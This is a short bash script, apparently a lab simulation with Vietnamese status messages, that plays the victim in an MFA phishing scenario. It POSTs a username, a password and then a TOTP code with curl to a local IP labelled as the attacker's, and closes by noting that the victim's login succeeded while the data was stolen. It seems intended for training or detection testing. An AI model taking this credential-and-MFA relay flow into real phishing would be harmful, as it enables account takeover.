#!/bin/bash
echo "[-] Nan nhan click vao link phishing: http://192.168.1.30 (IP Attacker)..."
sleep 2

echo "[-] BUOC 1: Nan nhan nhap Username va Password vao trang gia mao..."
curl -s -X POST -d "username=admin&password=SecretPassword123" http://192.168.1.30 > /dev/null
sleep 3

echo "[-] BUOC 2: Trang web yeu cau MFA. Nan nhan nhap ma TOTP..."
curl -s -X POST -d "mfa_code=852963" http://192.168.1.30 > /dev/null

echo "[-] Nan nhan dang nhap thanh cong (nhung khong biet thong tin da bi danh cap)!"
